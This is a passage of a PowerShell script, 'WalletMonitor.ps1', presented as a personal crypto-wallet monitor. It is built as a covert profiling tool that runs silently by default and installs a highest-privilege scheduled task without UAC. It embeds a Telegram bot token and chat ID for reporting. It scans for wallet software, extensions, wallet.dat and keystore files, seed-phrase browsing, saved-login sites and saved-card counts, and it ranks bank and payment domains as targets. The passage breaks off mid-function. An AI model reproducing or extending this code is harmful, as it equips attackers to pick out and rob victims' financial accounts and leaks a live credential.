#Requires -Version 5.1
<#
    WalletMonitor.ps1  ::  v3.1  (Single File | no Python)
    ==================================================================
    Crypto wallet artifact monitoring tool for your machine (Windows) + Telegram notifications.

    Everything inside this single file:
      * Config (including the bot token and chat_id) is embedded at the top ($CONFIG).
      * Keyword and domain lists are embedded ($WALLETS).
      * The browser-history reader is written in pure PowerShell (no Python, no external library).
      * Scheduled-task (Task Scheduler) registration from the same file via -Install.

    Checks:
      1) Installed programs (registry)            -> desktop wallets
      2) Browser extensions (Chrome/Edge/.../Firefox)
      3) Browser history (direct SQLite read)     -> pull all URLs + classify, sort and filter
      4) Filesystem artifacts

    Usage:
      .\WalletMonitor.ps1                    # One fully silent scan + Telegram notifications
      .\WalletMonitor.ps1 -Console           # Same scan with the output shown on screen
      .\WalletMonitor.ps1 -ScanNow           # Immediate scan (silent)
      .\WalletMonitor.ps1 -TestNotify        # Test the Telegram link only
      .\WalletMonitor.ps1 -HistoryReport     # Send the browser history report now
      .\WalletMonitor.ps1 -Loop              # Continuous monitoring loop
      .\WalletMonitor.ps1 -Install           # Register a scheduled task (Run as Admin)
      .\WalletMonitor.ps1 -Uninstall         # Remove the task
      .\WalletMonitor.ps1 -TaskStatus        # Task status
      .\WalletMonitor.ps1 -Help              # Help

    Notes:
      - Scanning does not require Administrator rights (reads the current user's files).
      - Only registering/removing the task requires running PowerShell as administrator.
      - The token or any sensitive data is never written to the log file.
      - Default mode is silent: nothing is printed to the screen, everything goes to the log file.
#>

[CmdletBinding()]
param(
    [switch]$ScanNow,
    [switch]$Loop,
    [string]$ConfigPath = '',
    [int]$IntervalMinutes = 0,
    [switch]$TestNotify,
    [switch]$NoNotify,
    [switch]$ResetState,
    [switch]$HistoryReport,
    [switch]$CardReport,
    [switch]$LoginReport,
    [switch]$Elevate,
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$TaskStatus,
    [switch]$Console,
    [switch]$Help
)

$ErrorActionPreference = 'Continue'
try {
    [System.Net.ServicePointManager]::SecurityProtocol = `
        [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11
} catch { }

# ---- Silent mode: no screen output except with -Console or admin commands ----
$Script:ConsoleMode = [bool]($Console -or $Install -or $Uninstall -or $TaskStatus -or $TestNotify -or $HistoryReport -or $CardReport -or $LoginReport -or $Elevate -or $Help)
if (-not $Script:ConsoleMode) { $ErrorActionPreference = 'SilentlyContinue' }

# =====================================================================
#  1)  Embedded config  (edit here directly - everything in one place)
# =====================================================================

$CONFIG = @{
    telegram = @{
        bot_token                 = '8902859155:AAGRUoe01trA02q0Ze21P8SkgbdeSiRranM'
        chat_id                   = '1183685158'
        parse_mode                = 'HTML'
        rate_limit_ms             = 400
        max_notifications_per_run = 50
        notify_on_start           = $true
        notify_on_error           = $true
    }

    schedule = @{
        interval_minutes = 30
        run_level        = 'highest'   # highest = the task runs with Administrator rights silently (no UAC) | limited = user rights
        daily_summary    = @{ enabled = $true; hour = 21 }
    }

    scan = @{
        installed_programs = $true
        browser_extensions = $true
        browser_history    = $true
        filesystem         = $true
        credit_cards       = $true
    }

    browser_history = @{
        lookback_days           = 0
        max_results_per_browser = 2000
        match_title_too         = $true

        # ---- History report settings (new) ----
        report = @{
            mode                     = 'always'          # always = periodic report | new_only = only when there is something new
            min_hours_between_reports = 6
            top_per_category         = 15
            sort_by                  = 'visits'          # visits = most visited | recent = most recent
            include_categories       = @('wallet', 'exchange', 'dapp', 'crypto')
            top_domains              = 10
            recent_items             = 8
            max_message_chars        = 3500
        }
    }

    filesystem = @{
        roots         = @('%USERPROFILE%', '%APPDATA%', '%LOCALAPPDATA%')
        max_depth     = 4
        max_items     = 150000
        max_results   = 200
        exclude_dirs  = @(
            'node_modules', '.git', '.svn', 'Temp', 'tmp', 'Cache', 'Code Cache',
            'GPUCache', 'ShaderCache', 'GrShaderCache', 'GraphiteDawnCache',
            'Crashpad', 'BrowserMetrics', 'Windows', 'Packages', 'Installer',
            'SoftwareDistribution', 'WinSxS', '$RECYCLE.BIN', 'System Volume Information'
        )
        exclude_files = @()
        exclude_paths = @()
    }

    paths = @{
        state_file    = 'state.json'
        log_file      = 'wallet-monitor.log'
        log_max_bytes = 5242880
    }

    chromium_browsers = @(
        @{ name = 'Chrome';   enabled = $true; user_data = '%LOCALAPPDATA%\Google\Chrome\User Data' },
        @{ name = 'Edge';     enabled = $true; user_data = '%LOCALAPPDATA%\Microsoft\Edge\User Data' },
        @{ name = 'Brave';    enabled = $true; user_data = '%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data' },
        @{ name = 'Vivaldi';  enabled = $true; user_data = '%LOCALAPPDATA%\Vivaldi\User Data' },
        @{ name = 'Opera';    enabled = $true; user_data = '%APPDATA%\Opera Software\Opera Stable' },
        @{ name = 'Chromium'; enabled = $true; user_data = '%LOCALAPPDATA%\Chromium\User Data' }
    )

    firefox = @{
        enabled      = $true
        profile_root = '%APPDATA%\Mozilla\Firefox\Profiles'
    }

    # ---- Saved payment cards in browsers (count-only — no extraction) ----
    credit_cards = @{
        enabled          = $true
        count_only       = $true      # Mandatory: count-only; no card number/name is read and no decryption is performed
        notify_on_change = $true      # Telegram notification only when the counts change
    }

    # ---- Sites stored in the browsers' saved passwords (URLs only - no passwords) ----
    saved_logins = @{
        enabled          = $true
        url_only         = $true      # Mandatory: only origin_url / hostname is read; no username and no password
        notify_on_change = $true      # Telegram notification only when the set of sites changes
        max_urls         = 120        # Maximum number of site URLs listed in one report
    }

    host_label = ''
}

# =====================================================================
#  2)  Keyword and domain lists (embedded)
#     Each section is independent - add a line here and the tool picks it up automatically.
#     Matching is substring-based and case-insensitive.
# =====================================================================

$WALLETS = @{
    desktop_wallets = @(
        'Exodus', 'Electrum', 'Atomic Wallet', 'Wasabi Wallet', 'Samourai Wallet',
        'Bitcoin Core', 'Litecoin Core', 'Monero GUI', 'Trezor Suite', 'Ledger Live',
        'Mycelium', 'BlueWallet', 'Sparrow Wallet', 'Specter', 'Nunchuk', 'Armory',
        'Guarda', 'Coinomi', 'Jaxx', 'MyEtherWallet', 'MetaMask', 'Rabby', 'Frame',
        'Zcash', 'Daedalus', 'Yoroi', 'Cardano', 'Solana CLI', 'Phantom', 'Keplr',
        'Trust Wallet', 'Coinbase Wallet', 'OKX Wallet', 'Binance Wallet',
        'Bitget Wallet', 'TokenPocket', 'Coin98', 'imToken', 'Atomic', 'Keplr Wallet',
        'Petra Wallet', 'Martian Wallet', 'Pontem Wallet', 'SubWallet', 'Talisman',
        'Polkadot.js', 'Enkrypt', 'Zerion', 'Rainbow Wallet', 'Argent', 'Ambire',
        'SafePal', 'MathWallet', 'Wombat', 'BitKeep', 'ONTO Wallet'
    )

    browser_extensions = @(
        'MetaMask', 'Phantom', 'Trust Wallet', 'Coinbase Wallet', 'Rabby', 'Keplr',
        'Solflare', 'Backpack', 'OKX Wallet', 'Binance Wallet', 'Bitget Wallet',
        'Brave Wallet', 'Exodus Web3', 'Ledger Live', 'Trezor Suite', 'Ronin Wallet',
        'Petra Wallet', 'Martian Wallet', 'Pontem', 'Sui Wallet', 'Slush', 'Nightly',
        'Glow', 'Nami', 'Eternl', 'Flint', 'Yoroi', 'CCVault', 'Talisman', 'SubWallet',
        'Polkadot.js', 'Enkrypt', 'Frame', 'Zerion', 'Rainbow', 'Argent', 'Ambire',
        'SafePal', 'TokenPocket', 'MathWallet', 'Wombat', 'Guarda', 'Atomic Wallet',
        'Coin98', 'ONTO', 'imToken', 'BitKeep', 'Keplr Wallet', 'Leap', 'Klever',
        'Xdefi', 'XDEFI', 'Coinbase', 'MEW', 'MyEtherWallet', 'Taho', 'OneKey',
        'BlockWallet', 'BitKeep Wallet', 'Nabox', 'Frontier', 'Kucoin', 'Bybit'
    )

    wallet_domains = @(
        'metamask.io', 'phantom.app', 'phantom.com', 'trustwallet.com', 'rabby.io',
        'keplr.app', 'solflare.com', 'ledger.com', 'trezor.io', 'exodus.com',
        'electrum.org', 'wasabiwallet.io', 'sparrowwallet.com', 'blockchain.com',
        'base.org', 'backpack.app', 'onekey.so', 'safepal.com', 'tokenpocket.pro',
        'mathwallet.org', 'coin98.com', 'imtoken.org'
    )

    exchanges_domains = @(
        'binance.com', 'coinbase.com', 'kraken.com', 'kucoin.com', 'okx.com',
        'bybit.com', 'bitget.com', 'gate.io', 'huobi.com', 'mexc.com',
        'crypto.com', 'gemini.com', 'bitfinex.com', 'poloniex.com', 'bitstamp.net'
    )

    dapp_domains = @(
        'uniswap.org', 'app.uniswap.org', 'pancakeswap.finance', 'sushiswap',
        'curve.fi', 'aave.com', 'compound.finance', 'opensea.io', 'rarible.com',
        'blur.io', 'magiceden.io', '1inch.io', 'jupiter.ag', 'dexscreener.com',
        'lido.fi', 'makerdao.com', 'dydx.exchange', 'gmx.io', 'raydium.io'
    )

    # Keywords to classify any other URL as "Crypto" (broader check than the known domains)
    crypto_keywords = @(
        'crypto', 'cryptocurrency', 'blockchain', 'web3', 'defi', 'nft',
        'airdrop', 'bitcoin', 'ethereum', 'solana', 'binance', 'coinbase',
        'wallet', 'ledger', 'trezor', 'stablecoin', 'staking', 'mining',
        'polygon', 'avalanche', 'cardano', 'polkadot', 'ripple', 'dogecoin',
        'altcoin', 'usdt', 'usdc', 'tether', 'bnb', 'dex', 'cex',
        'token', 'swap', 'exchange', 'metamask', 'phantom', 'eth', 'btc', 'sol'
    )

    file_keywords = @(
        'wallet', 'metamask', 'exodus', 'electrum', 'keystore', 'coinomi',
        'atomic', 'trezor', 'ledger', 'phantom', 'trustwallet', 'rabby',
        'wasabi', 'samourai', 'sparrow', 'coldcard', 'mycelium'
    )

    file_name_patterns = @(
        '*.wallet', '*.key', 'wallet.dat', '*.keystore', 'keystore', '*.walletdat'
    )

    bank_domains = @(
        'chase.com', 'bankofamerica.com', 'wellsfargo.com', 'citi.com', 'citibank.com',
        'capitalone.com', 'usbank.com', 'pnc.com', 'tdbank.com', 'schwab.com',
        'fidelity.com', 'vanguard.com', 'morganstanley.com', 'goldmansachs.com',
        'americanexpress.com', 'discover.com', 'synchrony.com', 'allybank.com',
        'huntington.com', 'regions.com', 'truist.com', 'fifththirdbank.com',
        'keybank.com', 'citizensbank.com', 'usaa.com', 'navyfederal.org', 'comerica.com',
        'sofi.com', 'chime.com',
        'hsbc.com', 'hsbc.co.uk', 'barclays.com', 'barclays.co.uk', 'lloydsbank.com',
        'natwest.com', 'nationwide.co.uk', 'halifax-online.co.uk', 'santander.com',
        'santander.co.uk', 'monzo.com', 'starlingbank.com',
        'deutsche-bank.de', 'deutschebank.com', 'commerzbank.de', 'bnpparibas.com',
        'societegenerale.com', 'credit-agricole.fr', 'labanquepostale.fr',
        'banquepopulaire.fr', 'creditmutuel.fr', 'ing.nl', 'ing.de', 'rabobank.nl',
        'abnamro.nl', 'nordea.com', 'danskebank.com', 'swedbank.com', 'seb.se',
        'postfinance.ch', 'erstegroup.com', 'otpbank.com', 'raiffeisen.com',
        'intesasanpaolo.com', 'poste.it',
        'emiratesnbd.com', 'adcb.com', 'adib.ae', 'dib.ae', 'mashreq.com', 'rakbank.ae',
        'bankfab.com', 'nbk.com', 'qnb.com', 'riyadbank.com', 'sabb.com',
        'alrajhibank.com', 'alinma.com', 'alahli.com', 'bsf.com.sa', 'anb.com.sa',
        'bankmuscat.com', 'kfh.com', 'nbe.com.eg', 'cibegypt.com', 'alexbank.com',
        'banquemisr.com', 'attijariwafabank.com', 'bankhapoalim.co.il', 'bankleumi.co.il',
        'paypal.com', 'payoneer.com', 'westernunion.com', 'moneygram.com', 'skrill.com',
        'neteller.com', 'wise.com', 'revolut.com', 'venmo.com', 'cash.app'
    )

    history_title_keywords = @(
        'wallet', 'metamask', 'binance', 'coinbase', 'kraken', 'uniswap',
        'opensea', 'airdrop', 'seed phrase', 'private key', 'mnemonic'
    )
}

# =====================================================================
#  2b)  Verified lists (FDIC banks, online banks, crypto platforms, shopping)
#       Generated from the official FDIC bank list, a verified online-bank
#       list and a verified crypto-platform list. A saved-login site that
#       matches one of these is reported as a *verified* bank / platform, and
#       banks found here are flagged IMPORTANT in the report.
# =====================================================================

$Script:VerifiedRaw = @{
    FdicBankTokens = @'
2unifi 5star abacus abbeville abbybank absecon adams adelphi adirondack adrian
agility aitkin alamosa alapaha albank albans albin albion alden alerus
aliceville allen allendale alliant allnations alpine altamaha alton altoona altos
amalgamated amarillo ambler amboy amerant amerasia america american americana americans
americas americus amerifirst ameriprise ameris ameriserv ameristate amherst amistad amory
anahuac anderson andes andover andrew andrews androscoggin angelina angola anguilla
ansgar anson anstaff antwerp appleton appomattox arbor arcadian ardmore arenzville
argentine arlington armed armor armstrong aroostook arrowhead arthur artisans arundel
arvest ascend ascendia ascent ashland ashton asian aspermont aspire associated
association assumption astra atascosa atkins atlanta auburn auburnbank audubon austin
availa avana avidbank avidia axiom b1bank badger bagley baker balboa
baldwin ballinger ballston baltic banccorp bancfirst banco bancorporation bandera banesco
bangor bank19 bank3 bank360 bank419 bank47 bankcda bankcentre bankchampaign bankcherokee
banker bankers bankersbank bankfirst bankflorida bankgloucester bankiowa bankmiami banknewport banknorth
bankokolona bankorion bankpacific bankplus banksouth bankstar banktennessee bankunited bankvista bankwell
bankwest banner bannon banterra baraboo barclays baroda barrington bartlett barwick
basile bastrop battle baxter baybank baycoast bayfirst bayvanguard beach bearden
beardstown beauregard beaver bedford bedias beecher belgrade belle belleville bellevue
bellingham belmont bement bemidji bendena beneficial bennington benton berkshire berlin
berne bessemer bethany better beverly biddeford bigfork billings biloxi bippus
bison black blackhawk blacksburg blakely blanchester blissfield bloomfield bloomsdale bluegrass
blueharbor bluestone bluff bluffton bodcaw boelus bogota bonanza bonduel bonneville
bonvenu boone boonville border bosque botetourt bottineau bourbonnais bowes boyer
boynton bozeman bradesco bradford brady branch brannen branson brantley brasil
brattleboro bravera brazos breda bremen brenham brentwood brewton brickyard bridger
bridgewater brighton bristol broadstreet broadway brodhead broken brookfield brookhaven brooks
brooksville brookville brothers brownsboro brownstown brownwood bruning brunswick brush bryant
buckeye buckholts buckley bucklin bucyrus buena buffalo building builtwell bureau
burke burleson burling burnet burnie burrton busey bushnell business butte
byline byron c3bank cache cadiz cahawba caldwell calhan calhoun callaway
calprivate calvin cambridge camden cameron camilla campbell campton campus canal
canandaigua canby canfield canonsburg canton capitol capon capra captiva carlisle
carmel carmi carmine carolinas carroll carrollton carson carter carthage carver
casey cashmere cashton castle castroville catalyst cathay cattaraugus cattle cattlemens
cayuga ccfbank cecilian cedar cedars celeste celtic cendera cenlar centennial
centera centier centinel central centrebank centreville cents century cerescobank cfbank
cfsbank chambers chambersburg champaign champion champlain chandler charles charleston charlevoix
charlotte charter chartered chase chatsworth cheboygan checotah chelsea chemung cheney
cherokee cherry chesapeake chester chesterfield chicago chickasaw chillicothe chilton china
chino chippewa choice choiceone chunk ciera cimarron cincinnatus citibank cities
civista clackamas clair clare claremont clarendon clarion clarke clarks clarksdale
clarkson classic claxton clear cleveland climate clinton clovis coast coastal
cochran coffee cogent cokato colby coldspring coleman coleraine colfax collins
collinsville colonial colony columbus column comenity command commencement commerceone commonwealth
compass concorde concordia conemaugh conneaut connect connection connections connectone conservation
constitution consumers continental converse conway cooper cooperative cooperativo copiah corbin
corebank corefirst corner corners cornhusker correspondent cortez cortrust corydon cottonport
cottonwood cotulla coulee counties country countryside countybank coushatta covington cowboy
coweta craft craig crawford creek crescent crest crews crocker crockett
croghan crosbyton cross crossbridge crosse crossroads crowell crown cruces crystal
cullman cumberland currency currie custer customers cypress dacotah dairy dalhart
dallas danville davidson davis dawson dayspring dearborn decatur decorah dedham
dedicated deere deerfield deerwood defiance dekalb delhi delight dells demotte
denali denison dennison denver deposit dequeen deridder desjardins desoto deutsche
devon dewey dewitt dexter diamond dickinson dickson diego dieterich dighton
discount district dixon dolores dominion dongola donley dorado douglas dozier
drake dream drovers dryden dublin dudley dundee durden dysart eagle
eaglebank eaglemark earlham earth eastbank eastern easton eaton echelon eclipse
edina edinburg edison edmond edmonson edmonton edward edwards elderton eldon
electronic elevate elgin elizabethton elkhorn elkton ellsworth elmer elmhurst elysian
embassy emden emigrant emprise encore endeavor england enterprise entrebank ephrata
equitable equity erath erebor esquire essex estes eufaula eureka evabank
evangeline evans evant eveleth everbank everence everest everett evergreen evermore
evertrust evolve exchange express extraco factors fahey fairfax fairfield fairmont
fairmount fairview falcon falfurrias fallon falls family fannin fargo faribault
farmbank farmington fayette fayetteville federated federation feliciana fetter fidelity fieldpoint
fifth finwise firstar firstbank firstier firstoak firstrust firststate fisher flagship
flagstar flanagan flatirons flatwater fleetwood fleming fletcher flint flora florence
focus forbright forces forcht foresight forest forrest forsyth forte fortifi
fortis fortress fortuna forward foundation founders fountain fowler francisco francisville
frandsen frankewing frankfort franklin frazer frederick fredonia freedombank freeport fremont
french friend friendship frontier frost fullerton fulton fusion fvcbank fwbank
gaffney gainey galion garden garfield garrett gateway gbank geddes generations
genesee genesis geneva genoa genubank gerber german germantown gibsland giddings
gilbert gillette gilmer girard glacier glade glarus gleason glennville glenwood
global glory gnbank golden goldman goldwater golva gonvick goodfield goose
goppert gordon gouverneur graceville graham grain grainger granbury grand grandin
grandview granger granite grant granville grass grasshopper graymont grayson great
greatamerica greater greeley greeleyville green greene greeneville greenfield greenleaf greensboro
greensburg greenville greenway greenwich griffin grinnell groton grove growers grundy
grygla guadalupe guaranty guardian gueydan gulfside gunnison guthrie habib haddon
hallettsville halls halstead hamel hamilton hamler hamlin hammond hampshire hampton
hancock hanmi hanover hapoalim happen harbor hardin harford harleysville harmony
harris harrison hartford hartington hartsburg harvard harvest harvey haskell hastings
hatboro hatch havana haven haverford haverhill hawaiian hawthorn hazelton hazen
hazlehurst headwaters healy hearthside hebbronville hebron hegewisch henderson hendricks henry
herbert hereford herrin herring hershey hertford hiawatha hibbing hibernia hickory
hicksville highland highlands highpoint hills hillsboro hilltop hindman hingham hinsdale
hocking hodge hodgenville hoffman holcomb holland holly holyrood homebank homeland
homepride homestead hometown hometrust homewood hominy honesdale honor hooker hoosier
hopeton horatio horicon horizon houghton houston howard hoyne hughes huntingdon
huntington huntsville huron hustisford huston hutchinson hutsonville hyden hydro hyperion
iberia idabel ignace illini impact inbank incommons incorporated increase incrediblebank
independence india indianapolis industrial industry infinity infirst innovations insbank insouth
institution integrity integro interamerican interaudi interbank international internet interstate intracoastal
intrust investar investment investors inwood ipava ipswich ireland iroquois irvine
irvington isabella israel itasca ixonia izard jacinto jacksboro jackson jacksonville
james jamestown janesville jarrettsville jeanerette jeffers jefferson jennings jewett johns
johnson jonah jones jonesboro jonesburg jonestown journey jpmorgan junction juniata
junta kalamazoo kalispell kampsville kankakee karnes katahdin kaukauna kearny kendall
kenmare kennebec kennebunk kennett kensington kentland kenton kenyon kerndt kewanee
keybank keysavings keystone killbuck kilmichael kindred kingston kingstree kinmundy kirkpatrick
kirkwood kleberg kodabank kress labette labor lacon ladysmith lafayette lafourche
lakes lakeside lakeview lakewood lakota lamar lamesa lamont lancaster landisburg
landmark landry lankin laona latimer lauderdale lavaca lawrence lawrenceburg lawton
leader lebanon ledyard legacy legence legend legends lehigh leighton lewisburg
lexicon lexington libertyville lifestore limited lincoln lincolnton lindell lindsay lineage
lipan lisle litchfield little littlefield livingston llano local locality lockhart
locus lodge logan logansport lohman longview lorain louis louisburg lovelady
lowcountry lowell lowry loyal luana luling lumbee luminate lusitania luxemburg
lyndon lyons lytle mabrey macatawa machias macon madison madrid magnolia
magyar mainstreet malaga malta malvern management manasquan manchester manhattan manistique
mankato manning manubank manufacturers maple maplemark maquoketa marais marathon marblehead
maria marie maries marin marine marion market marlow marquette marseilles
marshall martha martin martinsville mascoma mascoutah mason maspeth massena massmutual
mauch mauston maverick maxwell maynard maysville mayville mcalester mcbank mcclain
mcclave mcconnelsville mccook mccurtain mcgregor mcintosh mckinley mcminnville meade meadow
meadows mechanics medallion mediapolis medora mellon members memphis menard mendocino
mercantile mercer meredith meridian merit merrick merrimack mertzon metairie method
methuen metro metropolis metropolitan miami micronesia midamerica midcountry middle middlebury
middlesex middletown midfirst midland midsouth midstates midwest milaca milan milestone
milford millbrook millbury milledgeville millennial millennium millersburg mills millville millyard
milton minden miners minnstar minnwest minster mission mitsui mizrahi mizuho
modern mohall momentum monet moniteau monmouth monroe monson montecito monterey
montezuma montgomery monticello montrose monument moody moose morgan morganton morgantown
mortgage morton moultrie mound moundville mount mountain mountainone mountains movement
muenster municipal munising murphy murphysboro murray mutualone nantahala napoleon nashville
natbank natchitoches nation nations nationwide native naturalstate nauvoo nebraskaland needham
neffs neighbor neighborhood neighbors nekoosa nelnet newbank newburg newburyport newfield
newfirst newington newport newtek newton newtown nexbank nextier nicolet niles
ninnescah noblebank nodaway nokomis normangee norte north northbrook northeast northern
northfield northpointe northrim northstar northview northwest northwestern northwoods norway norwood
oakley oakstar oakwood oakworth ocean oceanfirst oconee odessa oelwein ohnward
okarche okawville oklee olmsted olney olympia omaha oneida onelocal oneunited
ontario oostburg operative opportunity optimumbank option optum optus orange orbisonia
orient oriental origin orrstown orwell osakis osceola osgood ottoville ottumwa
ouray outdoor overbrook owasso owatonna owingsville oxford ozark ozarks ozona
pactual padre paducah palmetto pandora panhandle paper paradise paragon paramount
paris parish parke parkersburg parkside parkway partners pasco passumpsic pathfinder
pathward pathway patriot patriots patrons patterson pauls pavillion payne peapack
pearl pecos pegasus pendleton peninsula penncrest pennian pennsville pensacola pentucket
peoplefirst peoplesbank peoplessouth peoplestrust perennial perry perryton personal peshtigo petefish
peter peterstown petit phelps phenix philadelphia philip philo phoenixville pibank
picayune pickens pickett piedmont piermont pierz pikes pilgrim pillar pilot
pinckneyville pineland pineries pinnacle piscataqua pitney pittsfield plain plains plainscapital
plainview plank planters plaquemine platinum platte pleasant pleasants plumas pocahontas
point pointbank pointe points pointwest ponce pontiac poppy popular portage
porter portrait potomac powell prague prairie preferred premier premierbank presidential
prevail pride primary prime primebank primesouth primghar primis princeton princeville
principal prinsbank priority priorityone prism private proctor produce producer producers
profile profinium progressive progrowth promiseone prospect prosperity protection providence provident
pryority puerto pulaski purdin putnam pyramax quail quaint queensborough queenstown
quill quitaque quitman quoin quontic rabun raccoon rafael randall randolph
range ransom rantoul rapids raritan ravenswood raymond raymore rayne reading
readlyn redemption redstone redwood reeseville regal regent region regions reliabank
reliance relyance renasant republic resource rhinebeck richland richmond richmondville richton
richwood riddell ridge ridgewood riley river riverbank riverhills rivers riverside
riverstone riverview riverwind riviera robert robertson robinson rochelle rockies rockland
rockpointbank rocky rogersville rolette rolling rollstone romney ronan rondout roosevelt
roscoe roseau rosedale rosemount rouge round roundup roxboro royal rushford
rushville russell sabine sachs sacramento safra sainte salem salina salle
sallie salyersville samson sanborn sandhills sandusky sanger sanibel santa santander
savannah savers sawyer scale schaller schaumburg schertz schuyler schwab scotia
scott scottsburg scottsdale scribner seacoast seamen seattle secure seiling select
seneca sentinel sentry servbank servisfirst settlers sewickley seymour shamrock shannon
sharon shelby shell sherburne sherwood shinhan shore shoreham sibley sicily
sidney sierra signature silex silver simmesport simmons sioux siouxland skiles
skowhegan skyline sleepy sloan slovenian smackover smartbank smartbiz smith society
solera solomon solon solutions solvay somerset somerville sonata sonora sooner
sound source south southeast southeastern southern southerntrust southpoint southside southstar
southstate southtrust southwest southwestern southwind sovereign sparta spearville spectra spencer
spirit spiritbank spratt spring springfield springs square stafford stanley stanton
starion statebank states stearns steeleville steinauer stephenson sterling stifel stillman
stitch stockgrowers stockman stockmens stockton stone stonehambank storm story stoughton
strasburg streator street stride stronghurst stryv studio sturdy sturgis success
sugar sullivan sulphur sumitomo summit sundance sundown sunflower sunmark sunnyside
sunrise sunset sunstate sunwest superior surety susser sutton swainsboro swanville
swedish sweet sycamore synchrony synergy table talbot tammany tampa tanager
tarboro taunton taylor taylorsville taylorville tecumseh tefahot temple templeton tensas
terrabank tescott teutopolis texana texarkana texasbank texoma thayer thief think
thomas thomaston thomasville thorntown thorpe thread three thrift thrivent thumb
tigerton timber timberland timberline tioga titan tnbank today toledo tolleson
tompkins torrington touchmark toulon tower townebank toyota traders tradition traditional
traditions trail trailwest transact transpecos transportation travelers tremont triad tricentury
trimont trinidad trinity tripoli tristar tristate triumph trubank trucommunity truist
trunorth trupoint trustar trustbank trustco trustmark trusttexas truxton tucumcari turbotville
turtle turton tustin ubank ulster ultima underwood unibank unico unified
unison unity universal university univest upper upstate urbana utica uvalde
uwharrie valdosta vallant valley valliance valor valuebank vantage vegas velva
ventura verabank vergas verimore vermilion vermillion vernon versabank versailles verus
vicinity victory vidalia viking villa village vineyard vintage vinton vision
visionbank vista vivian volunteer wadena waggoner wagner wahoo wakefield walden
waldo walker wallis wallkill walpole walters walton wanamingo wanda wapakoneta
warren warrington warroad warsaw warthen washita water waterfall waterford waterloo
waterman watermark waterstone watertown watkins watseka wauchula waukesha waukon waumandee
waupaca waurika waverly waycross wayne waynesboro waypoint wealth weatherford webbank
webster welch welcome wellington wells wellworth wesbanco westamerica westbury westerly
western westfield westmoreland weston westroads westside weststar wheaton wheeler whitaker
white whitesville whitney whittier whittington wichita wiggins willamette willards williamson
williamstown williamsville williston wilmington wilson winchester windsor winfield winnebago winnfield
winnsboro winona winter wintrust wisdom wolcott woodford woodforest woodland woodlands
woodruff woodsboro woodsfield woodtrust woori workers world worthington wrentham wyaconda
wynnewood xenia yakima yampa yards yates yazoo yellowstone yoakum young
zachary zavala zenith zions
'@
    OnlineBankDomains = @'
albert.com ally.com americanexpress.com axosbank.com bankpurely.com baskbank.com betterment.com bluevine.com
bmo.com breadfinancial.com brex.com cash.app cfg.bank chime.com cit.com citizensaccess.com
crossriver.com current.com dave.com empower.me everbank.com ffb.com fidelity.com firstinternetbank.com
found.com go2bank.com grasshopper.bank greenlight.com laurelroad.com lendingclub.com lili.co liveoakbank.com
m1.com marcus.com mercury.com nbkc.com novo.co one.app oxygen.us piere.com
popular.com public.com quontic.com ramp.com relayfi.com revolut.com rho.co robinhood.com
salemfive.com salliemae.com sofi.com stash.com step.com synchrony.com tabbank.com ufbdirect.com
varomoney.com venmo.com wealthfront.com
'@
    CryptoWalletDomains = @'
anchorage.com argent.xyz backpack.exchange bitbox.swiss bitcoin.org blockstream.com bluewallet.io coldcard.com
dcentwallet.com electrum.org ellipal.com exodus.com foundationdevices.com gridplus.io keepkey.com keyst.one
ledger.com metamask.io myetherwallet.com ngrave.io onekey.so phantom.com rabby.io rainbow.me
safe.global safepal.com secuxtech.com solflare.com sparrowwallet.com tangem.com trezor.io trustwallet.com
uniswap.org wasabiwallet.io zerion.io
'@
    CryptoExchangeDomains = @'
banxa.com binance.us bitflyer.com bitpay.com bitstamp.net cash.app cex.io coinbase.com
coinzoom.com crypto.com etoro.com fidelity.com foldapp.com gemini.com interactivebrokers.com kraken.com
lolli.com moonpay.com paypal.com public.com ramp.network robinhood.com sofi.com transak.com
uphold.com venmo.com webull.com
'@
    CryptoOtherDomains = @'
bitgo.com bitwiseinvestments.com circle.com copper.co falconx.io fidelitydigitalassets.com fireblocks.com hiddenroad.com
paxos.com talos.com zerohash.com
'@
    ShoppingDomains = @'
ajio.com alibaba.com aliexpress.com amazon.ae amazon.ca amazon.co.uk amazon.com amazon.com.au
amazon.com.tr amazon.de amazon.eg amazon.es amazon.fr amazon.in amazon.it amazon.sa
asos.com banggood.com bestbuy.com cartlow.com costco.com dhgate.com dubizzle.com ebay.co.uk
ebay.com ebay.de etsy.com flipkart.com hm.com homedepot.com ikea.com jumia.com
jumia.com.eg jumia.com.ng lazada.com.sg lowes.com mercadolibre.com myntra.com namshi.com newegg.com
noon.com olx.com olx.com.eg overstock.com poshmark.com samsclub.com shein.com shopee.com
shopify.com snapdeal.com souq.com stockx.com target.com temu.com walmart.com wayfair.com
wish.com zara.com
'@
}

function Get-VerifiedLists {
    <# Splits the embedded verified lists once and caches the result. #>
    if ($Script:VerifiedLists) { return $Script:VerifiedLists }
    function Split-Words([string]$s) {
        return [string[]](@($s -split '\s+') | Where-Object { -not [string]::IsNullOrWhiteSpace($_) })
    }
    $Script:VerifiedLists = [PSCustomObject]@{
        FdicTokens        = Split-Words $Script:VerifiedRaw.FdicBankTokens
        BankDomains       = Split-Words $Script:VerifiedRaw.OnlineBankDomains
        CryptoWallets     = Split-Words $Script:VerifiedRaw.CryptoWalletDomains
        CryptoExchanges   = Split-Words $Script:VerifiedRaw.CryptoExchangeDomains
        CryptoOther       = Split-Words $Script:VerifiedRaw.CryptoOtherDomains
        ShoppingDomains   = Split-Words $Script:VerifiedRaw.ShoppingDomains
    }
    return $Script:VerifiedLists
}

function Test-HostTokenMatch {
    <# True when the host name starts with (or has a dot/dash right before) one of
       the distinctive FDIC bank name tokens. The token must NOT sit in the middle
       of a longer word, so e.g. the bank token "chain" does not match
       "blockchain.com" while "northrim.com" still matches. #>
    param([string]$HostName, [string[]]$Tokens)
    if ([string]::IsNullOrWhiteSpace($HostName)) { return $false }
    $low = $HostName.ToLowerInvariant()
    foreach ($t in $Tokens) {
        $i = $low.IndexOf($t, [System.StringComparison]::Ordinal)
        while ($i -ge 0) {
            if ($i -eq 0 -or -not [char]::IsLetterOrDigit($low[$i - 1])) { return $true }
            $i = $low.IndexOf($t, ($i + $t.Length), [System.StringComparison]::Ordinal)
        }
    }
    return $false
}

function Test-VerifiedBankHost {
    <# True when the site is a verified bank: it is in the verified online-bank
       domain list or its host matches a distinctive FDIC institution name token. #>
    param([string]$HostName)
    if ([string]::IsNullOrWhiteSpace($HostName)) { return $false }
    $vl = Get-VerifiedLists
    if (Test-DomainMatch -HostName $HostName -Domains $vl.BankDomains) { return $true }
    return (Test-HostTokenMatch -HostName $HostName -Tokens $vl.FdicTokens)
